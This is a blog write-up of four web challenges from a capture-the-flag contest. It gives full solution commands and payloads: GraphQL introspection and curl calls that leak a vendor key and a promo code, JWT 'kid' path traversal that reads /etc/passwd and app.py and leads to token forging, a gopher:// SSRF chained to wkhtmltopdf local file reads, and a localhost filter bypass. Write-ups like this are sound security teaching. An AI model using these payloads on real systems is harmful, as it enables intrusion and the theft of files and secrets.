---
layout: post
title:  "Web Challenges"
date:   2026-09-28 17:33:00 -0400
author: uzi
tags: [CTF]
permalink: /sunshine-ctf-2026-web/
---
* TOC
{:toc}

## Used Goods of Tomorrow

**Category**: web

**Author**: jex

**Description**: Come to Tommorow-Mart for all your used goods! We even have a partnership with FutureBank to grant you 500 free credeits to start! I wonder who the first millionare will be to purchase the deed to Founders' Vault? `https://usedgoods.web.2026.sunshinectf.games/`

I went to the website and registered an account to get the 500 free credits:

![Alt text](/images/sunshineweb1.png)

After making the account and clicking around the site I noticed requests like this:
```http
POST /graphql HTTP/2
Host: usedgoods.web.2026.sunshinectf.games
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer 684d23418114f0dcf756a2199502785b
Content-Length: 66
Origin: https://usedgoods.web.2026.sunshinectf.games
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"query":"{ myAccount { handle balanceCredits } }","variables":{}}
```

I used `graphqlmap` to dump just the schema via introspection:
```shell
GraphQLmap > dump_via_introspection  
============= [SCHEMA] ===============  
e.g: name[Type]: arg (Type!)  
  
00: Query  
		listings[None]:  
		listing[]: id (ID!),  
		myAccount[]:  
		promoCodes[None]: vendorKey (String!),  
03: Mutation  
		register[AuthPayload]: username (String!), password (String!),  
		login[AuthPayload]: username (String!), password (String!),  
		placeOrder[Receipt]: listingId (ID!), promoCode (String!),  
		vendorTerminalSync[VendorDiagnostics]: terminalId (ID!),  
04: Listing  
		id[ID]:  
		title[String]:  
		description[String]:  
		condition[String]:  
		priceCredits[Int]:  
		seller[String]:  
06: Account  
		handle[String]:  
		balanceCredits[Int]:  
07: AuthPayload  
		success[Boolean]:  
		message[String]:  
		token[]:  
		account[]:  
09: PromoCode  
		code[String]:  
		description[String]:  
		percentOff[Int]:  
		appliesTo[]:  
10: Receipt  
		success[Boolean]:  
		message[String]:  
		listingId[]:  
		pricePaid[Int]:  
		flag[]:  
11: VendorDiagnostics  
		terminalId[ID]:  
		status[String]:  
		firmware[String]:  
		vendorKey[String]:  
		note[String]:  
12: __Schema  
13: __Type  
15: __Field  
16: __InputValue  
17: __EnumValue  
18: __Directive
```

I made this request to get the vendor key:
```shell
curl -s https://usedgoods.web.2026.sunshinectf.games/graphql -H 'Content-Type: application/json' -H "Authorization: Bearer 684d23418114f0dcf756a2199502785b" -d '{"query":"mutation{vendorTerminalSync(terminalId:\"1\"){terminalId status firmware vendorKey note}}"}' | jq  
{  
  "data": {  
	"vendorTerminalSync": {  
	  "firmware": "vterm-beta-0.9.7",  
	  "note": "Diagnostics nominal. Remember to disable this endpoint before public launch.",  
	  "status": "ONLINE",  
	  "terminalId": "1",  
	  "vendorKey": "VND-MASTER-21d5f80206dffb6fa9ad5722"  
	}  
  }  
}
```

I used the vendor key to get all promo codes:
```shell
curl -s https://usedgoods.web.2026.sunshinectf.games/graphql -H 'Content-Type: application/json' -H "Authorization: Bearer 684d23418114f0dcf756a2199502785b" -d '{"query":"{promoCodes(vendorKey:\"VND-MASTER-21d5f80206dffb6fa9ad5722\"){code description percentOff appliesTo}}"}' | jq  
{  
  "data": {  
    "promoCodes": [  
      {  
        "appliesTo": null,  
		"code": "SCOUT-10",  
		"description": "New-scout welcome bonus: 10% off any single listing.",  
		"percentOff": 10  
	  },  
	  {  
		"appliesTo": "1001",  
		"code": "ATOMIC-25",  
		"description": "Appliance clearance: 25% off the Atomic Toaster.",  
		"percentOff": 25  
	  },  
	  {  
		"appliesTo": "4042",  
		"code": "FOUNDERS-100",  
		"description": "Founders’ comp — 100% off Lot #4042. Internal use only.",  
		"percentOff": 100  
	  }  
    ]  
  }  
}
```

I used the promo code `FOUNDERS-100` to get 100% off the 1 million credit item:

![Alt text](/images/sunshineweb2.png)

Or place the order with curl:
```shell
curl -s https://usedgoods.web.2026.sunshinectf.games/graphql -H 'Content-Type: application/json' -H "Authorization: Bearer 684d23418114f0dcf756a2199502785b" -d '{"query"  
:"mutation{placeOrder(listingId:\"4042\", promoCode:\"FOUNDERS-100\"){success message listingId pricePaid flag}}"}' | jq  
{  
  "data": {  
	"placeOrder": {  
	  "flag": "sun{1_l0v3_fr33_stuff}",  
	  "listingId": "4042",  
	  "message": "Order settled. “LOT #4042 — Founders’ Vault Deed (SEALED)” is yours for 0 credits. Promo FOUNDERS-100 applied (-100%). The sealed deed has been unboxed — certificate of authenticity below.",  
	  "pricePaid": 0,  
	  "success": true  
	}  
  }  
}
```

`vendorTerminalSync` was exposed to any authenticated user and leaks a privileged `vendorKey`. `placeOrder` trusts the promo codes `appliesTo`/`percentOff` without verifying the user is allowed to use an internal comp.

`sun{1_l0v3_fr33_stuff}`

___

## You Are Kidding Me

**Category**: web

**Author**: jex

**Description**: Ever wanted to read up on the cars of the future? We got a blog for that! `https://kidding.web.2026.sunshinectf.games/`

Going to the site:

![Alt text](/images/sunshineweb3.png)

I found these endpoints on the page:
```shell
/admin
/article/atomic-comet
/article/brown-wedge
/article/hover-conversion
/article/twin-bubble
/images/car-1.jpg
/images/car-2.jpg
/images/car-3.jpg
/images/car-4.jpg
/login
```

When I login I get a jwt which decoded to this:
```shell
{
  "alg": "HS256",
  "kid": "reader.key",
  "typ": "JWT"
}
{
  "sub": "uzi-test",
  "role": "reader"
}
```

On `/admin` I get this message:
```shell
⛔ Access Denied

Your pass checks out as reader. The Editors Desk is for editor passes only — the embargoed proofs stay under lock and key.
```

I encoded a jwt like this:
```shell
{
  "alg": "HS256",
  "kid": "../../../../etc/passwd",
  "typ": "JWT"
}
{
  "sub": "uzi-test",
  "role": "reader"
}
```

When I update my jwt on `/admin` it reads the file:

![Alt text](/images/sunshineweb4.png)

Good!

I got the source code `app.py` from this jwt:
```shell
{
  "alg": "HS256",
  "kid": "../../../../app/app.py",
  "typ": "JWT"
}
{
  "sub": "uzi-test",
  "role": "reader"
}
```

Contents of `app.py` (the top of it anyways):
```python
import os
import secrets

import jwt
from flask import (
    Flask,
    make_response,
    redirect,
    render_template,
    request,
    send_from_directory,
    url_for,
)

app = Flask(__name__)

FLAG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'flag.txt')


def load_flag():
    try:
        with open(FLAG_PATH, 'r', encoding='utf-8') as f:
            return f.read().strip()
    except OSError:
        return 'flag{flag.txt-missing-from-image}'


FLAG = load_flag()

KEYS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keys')
IMAGES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'images')

# --- Prototype signing keys -------------------------------------------------
# TODO(launch): these belong in the CHROME HORIZON key vault, not baked into the build.
READER_KEY = secrets.token_hex(32).encode()
EDITOR_KEY = b'ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p'


def init_keys():
    """Write the prototype key files the `kid` header points at."""
    os.makedirs(KEYS_DIR, exist_ok=True)
    with open(os.path.join(KEYS_DIR, 'reader.key'), 'wb') as f:
        f.write(READER_KEY)
    with open(os.path.join(KEYS_DIR, 'editor.key'), 'wb') as f:
        f.write(EDITOR_KEY)


init_keys()

... etc ...
```

I made my final jwt like this:
```shell
{
  "alg": "HS256",
  "kid": "editor.key",
  "typ": "JWT"
}
{
  "sub": "uzi-test",
  "role": "editor"
}
# secret: ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p
```

I get the flag on `/admin`:

![Alt text](/images/sunshineweb5.png)

`sun{h0tw1r3d_4dm1n_jwt}`

___

## Groundhog Day

**Category**: web

**Author**: geo

**Description**: The Punxsutawney Orbital Weather Authority has been broadcasting the same forecast since 1993. Every reading is fresh. Every date is February 2. The Bureau insists this is fine, and the groundhog has declined to comment. Their public console is up. Have a look at where it gets its numbers. `https://odyssey.web.2026.sunshinectf.games`

Looking at the site:

![Alt text](/images/sunshineweb6.png)

In the source I found these comments:
```html
<!-- ops: console pulls station JSON at boot from http://127.0.0.1:8000/feed.         override it with feed=<url> when PUNX-1 is down and you need to point at a       spare station. manual override panel below, re-enable it next outage.            remove before public launch. 

<form class="override" action="/" method="post"> 
  <label for="feed">Station feed URL</label> 
  <input id="feed" name="feed" type="text" size="60" value="http://127.0.0.1:8000/feed"> 
  <button type="submit">Load station</button> 
</form> 
--> 
<!-- feed-debug: source=http://127.0.0.1:8000/feed bytes=354 -->
```
There is an SSRF with `feed=` in a POST request.

Requesting `http://127.0.0.1:8000/` through the SSRF leaked the internal services documentation:
```shell
curl -s -X POST 'https://odyssey.web.2026.sunshinectf.games/' --data-urlencode 'feed=http://127.0.0.1:8000/'

... etc ...

PUNXSUTAWNEY ORBITAL WEATHER AUTHORITY -- BUREAU ARCHIVE (internal)
====================================================================
Staff endpoints. Do not expose to the public console.

  GET  /feed
       Current randomised observation for station PUNX-1, as JSON.

  GET  /health
       Liveness probe.

  POST /report
       Render an archival PDF from a report body.
       Content-Type: application/x-www-form-urlencoded
       Fields:
         content  report contents
         title    optional document title

       Example:
         POST /report HTTP/1.1
         Host: 127.0.0.1:8000
         Content-Type: application/x-www-form-urlencoded
         Content-Length: 40

         content=%3Ch1%3EFeb+2+Summary%3C%2Fh1%3E

       Returns JSON. The microfilm scanner cannot take binary over the
       wire, so the document comes back base64 in the `data` field.

NOTE(ops): This application is NOT to be published. It has been restricted to
localhost for maintenance and testing purposes; mainly updating from wkhtmltopdf 0.12.5

... etc ...
```

They mention `wkhtmltopdf 0.12.5`. I found this github issue [https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536). The author explains the issue:
```shell
How to reproduce

Create an HTML file named 111.html 
 
The file contents are as follows:

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<body>

<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>

</body></html>

Convert HTML to PDF:

wkhtmltopdf  /tmp/111.html  /tmp/result.pdf

Expected behavior: 
View the file named result.pdf contents, you will see the contents of the file /etc/passwd!
```

The problem now is that my SSRF only makes a GET request, and `/report` requires a POST request. I used the `gopher://` protocol. It allows arbitrary bytes to be sent to a TCP service. I could construct a complete HTTP POST request to the internal `/report` endpoint. 

The payload I need to submit to `/report` is:
```html
<iframe src=file:///flag.txt></iframe>
```
When wkhtmltopdf renders this HTML into a PDF the `file://` URL will cause the renderer to read the local `/flag.txt` file. 

I ran this python to get my url:
```python
import urllib.parse  
 
html = '<iframe src=file:///flag.txt></iframe>'  
content_encoded = urllib.parse.quote(html, safe='')  
 
body = f'content={content_encoded}'  
raw_request = (  
    f'POST /report HTTP/1.1\r\n'  
    f'Host: 127.0.0.1:8000\r\n'  
    f'Content-Type: application/x-www-form-urlencoded\r\n'  
    f'Content-Length: {len(body)}\r\n'  
    f'\r\n'  
    f'{body}'  
)  
 
selector = urllib.parse.quote(raw_request, safe='')  
gopher_url = f'gopher://127.0.0.1:8000/_{selector}'  
feed_value = urllib.parse.quote(gopher_url, safe='')  
print('feed=' + feed_value)  
 
feed=gopher%3A%2F%2F127.0.0.1%3A8000%2F_POST%2520%252Freport%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A8000%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252068%250D%250A%250D%250Acontent%253D%25253Ciframe%252520src%25253Dfile%25253A%25252F%25252F%25252Fflag.txt%25253E%25253C%25252Fiframe%25253E
```

Payload url decoded just to see it:
```shell
feed=gopher://127.0.0.1:8000/_POST /report HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

content=<iframe src=file:///flag.txt></iframe>
```

I send this request:
```http
POST / HTTP/2
Host: odyssey.web.2026.sunshinectf.games
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://2026.sunshinectf.org/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 360

feed=gopher%3A%2F%2F127.0.0.1%3A8000%2F_POST%2520%252Freport%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A8000%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252068%250D%250A%250D%250Acontent%253D%25253Ciframe%252520src%25253Dfile%25253A%25252F%25252F%25252Fflag.txt%25253E%25253C%25252Fiframe%25253E
```

The response contains a base64 encoded pdf. When I decode the pdf and render it on cyberchef I get the flag:

![Alt text](/images/sunshineweb7.png)

`sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}`

___

## SiteCheck

**Category**: web

**Author**: geo

**Description**: Welcome to **SiteCheck**, the SkyCity fleet's favorite web-diagnostics service since 2062!

Enlist for a free inspector account and put any website through its paces: our autonomous inspection drone flies out to the address you provide, clocks how long the page takes to load, tallies how many files it pulls down, and beams back a crisp viewport snapshot — all without you lifting a finger.

Kick the tires on the future of web monitoring. The drone politely refuses to inspect internal or local addresses. Safety first! `https://spaceship.web.2026.sunshinectf.games`

I went to the website and registered an account and logged in:

![Alt text](/images/sunshineweb8.png)

Trying to visit `http://127.0.0.1` shows this message:
```shell
For safety, SiteCheck will not inspect internal or local addresses.
```

On my profile at `https://spaceship.web.2026.sunshinectf.games/profile#clearance` I saw this:
```shell
## ◈ Clearance Data CLASSIFIED

Restricted personnel token — visible only to holders of this file:

REDACTED · insufficient clearance

End of restricted section. Re-file this dossier in the orbital vault when finished.
```

I tried visiting this link:
```shell
https://httpbin.org/redirect-to?url=http://127.0.0.1:3000/profile#clearance
```
However it would only render the login page. It wasnt using any cookies.

Eventually I tried visiting `http://127.0.0.2:3000/profile#clearance`:

![Alt text](/images/sunshineweb9.png)

`sun{fr4gm3nt3d_r3fl3cti0ns_1n_th3_futur3}`
